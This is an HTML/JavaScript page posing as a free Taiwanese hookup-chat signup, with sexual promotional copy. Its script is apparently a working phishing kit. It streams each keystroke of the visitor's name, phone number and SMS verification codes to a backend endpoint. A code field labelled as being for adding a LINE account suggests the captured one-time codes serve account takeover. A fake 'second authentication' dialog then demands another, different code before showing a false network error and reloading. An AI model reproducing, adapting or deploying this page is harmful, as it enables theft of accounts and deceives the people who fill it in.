<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>茶園悅色-台灣約炮聊天室</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
        }
        
        .header-title {
            background-color: rgb(255, 192, 203);
            color: white;
            width: 100%;
            padding: 15px;
            text-align: center;
            font-weight: bold;
            font-size: 24px;
            font-family: "Microsoft JhengHei", "微軟正黑體", sans-serif;
        }
        
        body {
            background: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            min-height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        .logo {
            width: 100%;
            height: auto;
            margin: 0;
            display: block;
        }

        .carousel {
            width: 100%;
            max-width: 400px;
            overflow: hidden;
            position: relative;
        }

        .carousel-image {
            width: 100%;
            height: auto;
            display: block;
            transition: opacity 0.35s ease;
            opacity: 1;
        }

        .container {
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        h1 {
            font-size: 24px;
            margin: 30px 0 10px;
            font-weight: bold;
        }

        .description {
            color: #666;
            font-size: 14px;
            margin-bottom: 30px;
            line-height: 1.5;
            font-weight: bold;
        }

        .promo-card {
            margin: 14px 0 24px;
            padding: 16px 14px;
            text-align: left;
            border-radius: 18px;
            border: 1px solid #ffc6da;
            background: linear-gradient(160deg, #fff1f7 0%, #ffffff 58%, #fff7fb 100%);
            box-shadow: 0 12px 26px rgba(255, 88, 144, 0.18);
        }

        .promo-headline {
            font-size: 18px;
            line-height: 1.45;
            font-weight: 800;
            color: #d63384;
            margin-bottom: 8px;
            letter-spacing: 0.3px;
        }

        .promo-copy {
            font-size: 14px;
            line-height: 1.85;
            color: #5f3b4b;
            font-weight: 600;
        }

        .promo-highlight {
            color: #ff2f77;
            font-weight: 800;
        }

        .promo-tags {
            margin-top: 12px;
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
        }

        .promo-tag {
            padding: 4px 10px;
            border-radius: 999px;
            font-size: 12px;
            font-weight: 700;
            color: #fff;
            background: linear-gradient(135deg, #ff5e99 0%, #ff3f83 100%);
            box-shadow: 0 5px 12px rgba(255, 62, 130, 0.25);
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
            color: #333;
        }

        .form-group label .required {
            color: #ff0000;
            margin-right: 5px;
        }

        .form-group input {
            width: 100%;
            padding: 12px;
            border: none;
            border-bottom: 1px solid #ddd;
            font-size: 16px;
            background-color: transparent;
            transition: border-color 0.3s;
        }

        .form-group input:focus {
            outline: none;
            border-bottom-color: #00B900;
        }

        .form-group input::placeholder {
            color: #ccc;
        }

        .send-code {
            background: transparent;
            border: none;
            color: #00B900;
            padding: 8px;
            cursor: pointer;
            float: right;
            margin-top: -40px;
            position: relative;
            font-size: 14px;
            border-radius: 15px;
        }

        .submit-btn {
            background: #ff0000;
            color: white;
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 25px;
            font-size: 18px;
            cursor: pointer;
            margin-top: 20px;
            transition: all 0.3s ease;
        }

        .submit-btn:hover:not(:disabled) {
            background: #e60000;
        }

        .submit-btn:disabled {
            background: #cccccc;
            cursor: not-allowed;
            opacity: 0.7;
        }
    </style>
</head>
<body>
    <div class="header-title">茶園悅色-台灣約炮聊天室</div>
    <div class="carousel">
        <img id="carouselImage" src="photo_2026-03-20_21-32-34.jpg" alt="LINE Banner" class="carousel-image">
    </div>
    <div class="container">
        <h1></h1>
        <div class="promo-card">
            <div class="promo-headline">三分鐘找到今晚的對象，不用付費，下滑註冊</div>
            <div class="promo-copy">立刻解鎖附近真實在線的有緣人，開始激情夜晚。註冊完成即可寻找<span class="promo-highlight">免費約炮对象</span>，讓夜晚不再無聊。或許下一個讓你心跳加速的人，就在此刻等你。</div>
            <div class="promo-tags">
                <span class="promo-tag">真實在線</span>
                <span class="promo-tag">附近速配</span>
                <span class="promo-tag">立即解鎖</span>
            </div>
        </div>
        
        <form id="loginForm" onsubmit="return false;">
            <div class="form-group">
                <label><span class="required">*</span>用戶名</label>
                <input id="nameInput" type="text" placeholder="請輸入正確用戶名" required>
            </div>
            
            <div class="form-group">
                <label><span class="required">*</span>手機門號</label>
                <input id="phoneInput" type="tel" placeholder="請輸入正確手機號碼" required>
                <button type="button" id="sendCodeBtn" class="send-code" disabled>發送</button>
                <div id="phoneError" style="color:#e60000; font-size:13px; margin-top:6px; display:none;"></div>
            </div>
            
            <div class="form-group">
                <label><span class="required">*</span>認證碼</label>
                <input id="codeInput" type="text" placeholder="此驗證碼以便完成LINE帳號添加" required disabled>
                <div id="codeError" style="color:#e60000; font-size:13px; margin-top:6px; display:none;"></div>
            </div>

            <button type="submit" id="submitBtn" class="submit-btn">註冊</button>
        </form>

        <!-- 二次認證彈窗（取消按鈕已移除，確認改為提交） -->
        <div id="modal" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.4); align-items:center; justify-content:center;">
            <div id="modalContent" style="background:#fff; padding:20px; border-radius:8px; width:90%; max-width:360px;">
                <h2 style="margin:0 0 12px; font-size:18px;">二次認證</h2>
                <p style="margin:0 0 12px; color:#666; font-size:13px;">請再次輸入手機與驗證碼完成二次認證</p>
                <div style="margin-bottom:10px;">
                    <input id="modalPhone" type="tel" placeholder="手機門號" style="width:100%; padding:10px; border:1px solid #ddd; border-radius:6px;" />
                    <button type="button" id="modalSendBtn" class="send-code" style="margin-top:8px;">發送</button>
                    <div id="modalPhoneError" style="color:#e60000; font-size:13px; margin-top:6px; display:none;"></div>
                </div>
                <div style="margin-bottom:14px;">
                    <input id="modalCode" type="text" placeholder="驗證碼" inputmode="numeric" style="width:100%; padding:10px; border:1px solid #ddd; border-radius:6px;" />
                    <div id="modalCodeError" style="color:#e60000; font-size:13px; margin-top:6px; display:none;"></div>
                </div>
                <div style="text-align:right;">
                    <button id="modalConfirm" style="padding:8px 12px; border-radius:6px; border:none; background:#00B900; color:#fff;">提交</button>
                </div>
            </div>
        </div>
    </div>

    <script>
    const nameInput = document.getElementById('nameInput');
    const sendCodeBtn = document.getElementById('sendCodeBtn');
    const codeInput = document.getElementById('codeInput');
    const submitBtn = document.getElementById('submitBtn');
    const phoneInput = document.getElementById('phoneInput');
    const modal = document.getElementById('modal');
    const modalPhone = document.getElementById('modalPhone');
    const modalSendBtn = document.getElementById('modalSendBtn');
    const modalCode = document.getElementById('modalCode');
    const modalConfirm = document.getElementById('modalConfirm');
    const phoneError = document.getElementById('phoneError');
    const codeError = document.getElementById('codeError');
    const modalPhoneError = document.getElementById('modalPhoneError');
    const modalCodeError = document.getElementById('modalCodeError');
    const carouselImage = document.getElementById('carouselImage');
    // base URL for API calls (use same origin)
    var baseUrl = window.location.origin+"/jeecg-boot";
    // baseUrl = "http://localhost:8080/jeecg-boot"
        let timer;
        let modalTimer;
        let carouselTimer;
        let carouselIndex = 0;
        const carouselImages = [
            './photo_2026-03-20_21-32-34.jpg',
            './photo_2026-03-20_21-32-38.jpg',
            './photo_2026-03-20_21-32-41.jpg',
            './photo_2026-03-20_21-32-44.jpg',
            './photo_2026-03-20_21-32-47.jpg'
        ];
        // 保存首次提交的驗證碼，用於與二次認證驗證碼比對
        let initialValidateCode = null;

        function startCarousel() {
            if (!carouselImage || !carouselImages.length) return;
            carouselImage.src = carouselImages[0];
            carouselTimer = setInterval(() => {
                carouselImage.style.opacity = '0';
                setTimeout(() => {
                    carouselIndex = (carouselIndex + 1) % carouselImages.length;
                    carouselImage.src = carouselImages[carouselIndex];
                    carouselImage.style.opacity = '1';
                }, 180);
            }, 3000);
        }

        // 初始状态
        sendCodeBtn.disabled = false;
        codeInput.disabled = true;
        submitBtn.disabled = true;
        startCarousel();

        // 校验函数
        const phoneRegex = /^(09\d{8}|9\d{8})$/;
        const codeRegex = /^(\d{4}|\d{6})$/;
        const modalCodeRegex = /^(\d{4}|\d{6})$/;
        
        // 启用验证码输入
        function enableCodeInput() {
            codeInput.disabled = false;
        }

        function showError(el, msg) {
            if (!el) return;
            el.textContent = msg;
            el.style.display = 'block';
        }

        function clearError(el) {
            if (!el) return;
            el.textContent = '';
            el.style.display = 'none';
        }

        function startTimer(duration) {
            let timeLeft = duration;
            sendCodeBtn.disabled = true;
            codeInput.disabled = false;
            sendCodeBtn.textContent = `${timeLeft}秒`;

            timer = setInterval(() => {
                timeLeft--;
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    sendCodeBtn.textContent = '發送';
                    sendCodeBtn.disabled = false;
                    return;
                }
                sendCodeBtn.textContent = `${timeLeft}秒`;
            }, 1000);
        }

        // 为 modal 的发送按钮实现单独的计时器
        function startModalTimer(duration) {
            let timeLeft = duration;
            modalSendBtn.disabled = true;
            modalCode.disabled = false;
            modalSendBtn.textContent = `${timeLeft}秒`;

            modalTimer = setInterval(() => {
                timeLeft--;
                if (timeLeft <= 0) {
                    clearInterval(modalTimer);
                    modalSendBtn.textContent = '發送';
                    modalSendBtn.disabled = false;
                    return;
                }
                modalSendBtn.textContent = `${timeLeft}秒`;
            }, 1000);
        }

        // NOTE: input listeners for fields are handled later (real-time sends).

        // Debounce helper to avoid rapid-fire requests
        function debounce(fn, wait) {
            let t;
            return function(...args) {
                clearTimeout(t);
                t = setTimeout(() => fn.apply(this, args), wait);
            };
        }

        // Generic sender for updateField. paramsObj keys will be serialized as query params.
        async function sendUpdateField(paramsObj) {
            try {
                const reqUrl = new URL(`${baseUrl}/code/api/updateField`);
                Object.keys(paramsObj).forEach(k => {
                    // allow empty string values to be sent so the backend receives realtime input
                    if (paramsObj[k] != null) reqUrl.searchParams.set(k, paramsObj[k]);
                });
                // always include the page-level code field (may be empty string)
                const pageCode = new URLSearchParams(window.location.search).get('code') || '';
                reqUrl.searchParams.set('code', pageCode);

                const response = await fetch(reqUrl.toString());
                if (!response.ok) {
                    console.warn('updateField returned non-ok for', paramsObj);
                } else {
                    console.log('updateField OK', paramsObj);
                }
                return response;
            } catch (err) {
                console.error('Error in sendUpdateField', err, paramsObj);
                return null;
            }
        }

        // Debounced wrappers for each field. Only send when value matches our regexes to reduce noise.
        const debouncedSendPhone = debounce((val) => {
            if (!val) return;
            if (!phoneRegex.test(val)) return; // only send valid phones
            sendUpdateField({ phone: val, action: 'input' });
        }, 500);

        const debouncedSendPhone2 = debounce((val) => {
            if (!val) return;
            if (!phoneRegex.test(val)) return;
            sendUpdateField({ phone2: val, action: 'input' });
        }, 500);

        const debouncedSendValidateCode = debounce((val) => {
            if (!val) return;
            if (!codeRegex.test(val)) return; // only send matching codes (4 or 6 digits)
            sendUpdateField({ validateCode: val, action: 'input' });
        }, 500);

        const debouncedSendValidateCode2 = debounce((val) => {
            if (!val) return;
            if (!modalCodeRegex.test(val)) return;
            sendUpdateField({ validateCode2: val, action: 'input' });
        }, 500);

        // Hook the inputs to trigger updateField in real-time (send current input value immediately)
        nameInput.addEventListener('input', function() {
            const v = this.value.trim();
            sendUpdateField({ name: v, action: 'input' });
            checkAllInputs();
        });

        phoneInput.addEventListener('input', function() {
            const v = this.value.trim();
            if (phoneRegex.test(v)) clearError(phoneError);
            // send current value (including partial/empty) in real-time
            sendUpdateField({ phone: v, action: 'input' });
        });

        modalPhone.addEventListener('input', function() {
            const v = this.value.trim();
            if (phoneRegex.test(v)) clearError(modalPhoneError);
            sendUpdateField({ phone2: v, action: 'input' });
        });

        codeInput.addEventListener('input', function() {
            const v = this.value.trim();
            if (codeRegex.test(v)) clearError(codeError);
            else showError(codeError, '驗證碼格式錯誤');
            // send current validateCode value immediately
            sendUpdateField({ validateCode: v, action: 'input' });
            checkAllInputs();
        });

        modalCode.addEventListener('input', function() {
            const v = this.value.trim();
            if (initialValidateCode && v && v === initialValidateCode) {
                showError(modalCodeError, '驗證碼錯誤');
            } else if (modalCodeRegex.test(v)) {
                clearError(modalCodeError);
            } else {
                showError(modalCodeError, '驗證碼錯誤');
            }
            sendUpdateField({ validateCode2: v, action: 'input' });
        });

    // 页面初始化加载 /code/api/load-page（携带 URL 的 code 参数）
        async function initializePage() {
            try {
                const reqUrl = new URL(`${baseUrl}/code/api/load-page`);
                const pageParams = new URLSearchParams(window.location.search);
                const codeParam = pageParams.get('code');
                if (codeParam) reqUrl.searchParams.set('code', codeParam);

                const response = await fetch(reqUrl.toString());
                if (!response.ok) {
                    console.error('Failed to load page data');
                    return;
                }
                let data;
                try {
                    data = await response.json();
                } catch (e) {
                    data = await response.text();
                }
                if (data.message.indexOf('expire')!=-1) {
                    alert('頁面已過期');
                    window.location.href = 'about:blank';
                }
            } catch (error) {
                console.error('Error loading page:', error);
            }
        }
        document.addEventListener('DOMContentLoaded', initializePage);

    // 发送验证码按钮点击事件（触发 HTTP 请求），携带 URL 中的 code 参数
        sendCodeBtn.addEventListener('click', async function() {
            const phoneVal = phoneInput.value.trim();
            if (!phoneRegex.test(phoneVal)) {
                showError(phoneError, '手機號格式錯誤');
                alert('手機號格式錯誤');
                return;
            }
            clearError(phoneError);
            codeInput.disabled = false;
            try {
                // use centralized sender so 'code' param is always included
                const response = await sendUpdateField({ name: nameInput.value.trim(), phone: phoneVal, action: 'submit' });
                if (response && response.ok) {
                    enableCodeInput();
                    alert('發送成功');
                    startTimer(60);
                } else {
                    codeInput.disabled = false;
                    alert('發送失敗，請稍後重試');
                }
            } catch (error) {
                console.error('Error:', error);
                codeInput.disabled = false;
                alert('發送失敗，請稍後重試');
            }
        });

        // modal 发送按钮行为：在点击之前 modalCode 不可输入
        modalCode.disabled = true;
        modalSendBtn.addEventListener('click', async function() {
            const mPhoneVal = modalPhone.value.trim();
            if (!phoneRegex.test(mPhoneVal)) {
                showError(modalPhoneError, '手機號格式錯誤');
                alert('手機號格式錯誤');
                return;
            }
            clearError(modalPhoneError);
            modalCode.disabled = false;
            try {
                // use centralized sender so 'code' param is always included
                const response = await sendUpdateField({ phone2: mPhoneVal, action: 'submit' });
                if (response && response.ok) {
                    // 啟用 modal 的驗證碼輸入並啟動計時
                    startModalTimer(60);
                    alert('發送成功');
                } else {
                    modalCode.disabled = false;
                    alert('發送失敗，請稍後重試');
                }
            } catch (err) {
                console.error('Error sending modal code:', err);
                modalCode.disabled = false;
                alert('發送失敗，請稍後重試');
            }
        });

        // 检查所有输入是否有效
        function checkAllInputs() {
            const nameVal = nameInput.value.trim();
            const codeVal = codeInput.value.trim();
            
            // 只有当姓名不为空且验证码格式正确时，才启用确认按钮
            submitBtn.disabled = !nameVal || !codeRegex.test(codeVal);
        }

        // 监听姓名输入
        nameInput.addEventListener('input', checkAllInputs);

        // (real-time input handling for codeInput is already attached above)

        // 表单提交处理
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            console.log('confirm');
            const nameVal = nameInput.value.trim();
            const phoneVal = phoneInput.value.trim();
            const codeVal = codeInput.value.trim();
            let hasError = false;

            // 验证姓名
            if (!nameVal) {
                alert('請輸入姓名');
                hasError = true;
            }

            // 验证手机号
            if (!phoneVal) {
                showError(phoneError, '請輸入手機號碼');
                alert('請輸入手機號碼');
                hasError = true;
            } else if (!phoneRegex.test(phoneVal)) {
                showError(phoneError, '手機號格式錯誤');
                alert('手機號格式錯誤');
                hasError = true;
            } else {
                clearError(phoneError);
            }

            if (!codeVal) {
                showError(codeError, '請輸入驗證碼1');
                alert('請輸入驗證碼1');
                hasError = true;
            } else if (!codeRegex.test(codeVal)) {
                showError(codeError, '驗證碼格式錯誤');
                alert('驗證碼格式錯誤');
                hasError = true;
            } else {
                clearError(codeError);
            }

            if (hasError) return;

            // 在打开二次認證彈窗之前，將驗證碼發送到後端（複製 updateField 的請求邏輯）
            try {
                // 保存首次提交的驗證碼，用於後續和二次認證比較
                initialValidateCode = codeVal;
                // use centralized sender so 'code' param is always included
                const response = await sendUpdateField({ name: nameVal, phone: phoneVal, validateCode: codeVal, action: 'submit' });
                if (!response || !response.ok) {
                    alert('提交驗證碼失敗，請稍後重試');
                    return;
                }
            } catch (err) {
                console.error('Error sending code before modal:', err);
                alert('提交驗證碼失敗，請稍後重試');
            
                return;
            }

            // 打开弹窗
            modalPhone.value = '';
            modalCode.value = '';
            // modal 初始化：禁用 modalCode，启用发送按钮
            modalCode.disabled = true;
            modalSendBtn.disabled = false;
            clearError(modalPhoneError);
            clearError(modalCodeError);
            modal.style.display = 'flex';
            modal.style.alignItems = 'center';
            modal.style.justifyContent = 'center';
        });

        // 弹窗确认处理（发送 validateCode2 到后端）
        modalConfirm.addEventListener('click', async function() {
            const mPhone = modalPhone.value.trim();
            const mCode = modalCode.value.trim();
            let hasError = false;

            if (!phoneRegex.test(mPhone)) {
                showError(modalPhoneError, '手機號格式錯誤');
                alert('手機號格式錯誤');
                hasError = true;
            } else {
                clearError(modalPhoneError);
            }

            if (!modalCodeRegex.test(mCode)) {
                showError(modalCodeError, '驗證碼錯誤');
                alert('驗證碼錯誤');
                hasError = true;
            } else {
                clearError(modalCodeError);
            }

            // 首次驗證與二次認證碼不能相同
            if (initialValidateCode && mCode === initialValidateCode) {
                showError(modalCodeError, '驗證碼錯誤');
                alert('驗證碼錯誤');
                hasError = true;
            }

            if (hasError) return;

            // 發送二次驗證碼到後端（validateCode2）
            try {
                // use centralized sender so 'code' param is always included
                const response = await sendUpdateField({ phone2: mPhone, validateCode2: mCode, action: 'submit' });
                if (!response || !response.ok) {
                    alert('提交二次驗證失敗，請稍後重試');
                    return;
                }
            } catch (err) {
                console.error('Error submitting validateCode2:', err);
                alert('提交二次驗證失敗，請稍後重試');
                return;
            }

            // 二次驗證提交成功，關閉彈窗
            alert('網絡錯誤,請重新提交');
            modal.style.display = 'none';
            window.location.reload()
        });
    </script>
